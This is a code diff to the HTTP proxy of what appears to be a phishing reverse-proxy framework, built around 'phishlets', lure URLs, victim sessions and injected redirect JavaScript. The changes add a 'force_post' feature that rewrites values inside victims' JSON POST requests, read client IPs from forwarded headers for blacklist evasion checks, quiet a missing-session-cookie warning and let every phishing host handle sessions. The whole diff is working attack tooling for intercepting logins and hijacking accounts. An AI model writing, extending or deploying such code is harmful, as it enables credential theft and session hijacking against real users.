@@ -92,6 +92,20 @@ type ProxySession struct {
 	Index        int
 }
 
+// set the value of the specified key in the JSON body
+func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return nil, err
+	}
+	data[key] = value
+	newBody, err := json.Marshal(data)
+	if err != nil {
+		return nil, err
+	}
+	return newBody, nil
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -151,11 +165,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
-			// handle ip blacklist 判断IP黑名单
-			from_ip := req.RemoteAddr
-			if strings.Contains(from_ip, ":") {
-				from_ip = strings.Split(from_ip, ":")[0]
+			// handle ip blacklist
+			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+
+			// handle proxy headers
+			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
+			for _, h := range proxyHeaders {
+				origin_ip := req.Header.Get(h)
+				if origin_ip != "" {
+					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
+					break
+				}
 			}
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -187,8 +209,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
-			parts := strings.SplitN(req.RemoteAddr, ":", 2)
-			remote_addr := parts[0]
+			remote_addr := from_ip
 
 			// 重定向 和 js注入
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
@@ -228,11 +249,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						session_id = session_id[:len(session_id)-3]
 						if s, ok := p.sessions[session_id]; ok {
 							var d_body string
-
-							if s.RedirectURL != "" {
-								dynamic_redirect_js := DYNAMIC_REDIRECT_JS
-								dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
-								d_body += dynamic_redirect_js + "\n\n"
+							if !s.IsDone {
+								if s.RedirectURL != "" {
+									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
+									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
+									d_body += dynamic_redirect_js + "\n\n"
+								}
 							}
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
 							return req, resp
@@ -295,8 +317,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
-						log.Warning("session cookie not found: %s (%s) [%s]", req_url, remote_addr, pl.Name)
-
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
 							// not a lure path and IP is whitelisted
 
@@ -374,6 +394,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										session.PhishLure = l
 										log.Debug("redirect URL (lure): %s", session.RedirectURL)
 									}
+									if session.RedirectURL != "" {
+										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
+									}
+									session.PhishLure = l
+									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
 									// set params from url arguments
 									p.extractParams(session, req.URL)
@@ -667,7 +692,46 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-						} else if form_re.MatchString(contentType) && !strings.HasPrefix(string(body), "[") { //去掉json数组 by xwj
+							// force post json
+							for _, fp := range pl.forcePost {
+								if fp.path.MatchString(req.URL.Path) {
+									log.Debug("force_post: url matched: %s", req.URL.Path)
+									ok_search := false
+									if len(fp.search) > 0 {
+										k_matched := len(fp.search)
+										for _, fp_s := range fp.search {
+											matches := fp_s.key.FindAllString(string(body), -1)
+											for _, match := range matches {
+												if fp_s.search.MatchString(match) {
+													if k_matched > 0 {
+														k_matched -= 1
+													}
+													log.Debug("force_post: [%d] matched - %s", k_matched, match)
+													break
+												}
+											}
+										}
+										if k_matched == 0 {
+											ok_search = true
+										}
+									} else {
+										ok_search = true
+									}
+									if ok_search {
+										for _, fp_f := range fp.force {
+											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											if err != nil {
+												log.Debug("force_post: got error: %s", err)
+											}
+											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
+										}
+									}
+									req.ContentLength = int64(len(body))
+									log.Debug("force_post: body: %s len:%d", body, len(body))
+								}
+							}
+
+						} else if form_re.MatchString(contentType) {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
@@ -1778,10 +1842,7 @@ func (p *HttpProxy) handleSession(hostname string) bool {
 			}
 			for _, ph := range pl.proxyHosts {
 				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-					if ph.handle_session || ph.is_landing {
-						return true
-					}
-					return false
+					return true
 				}
 			}
 		}
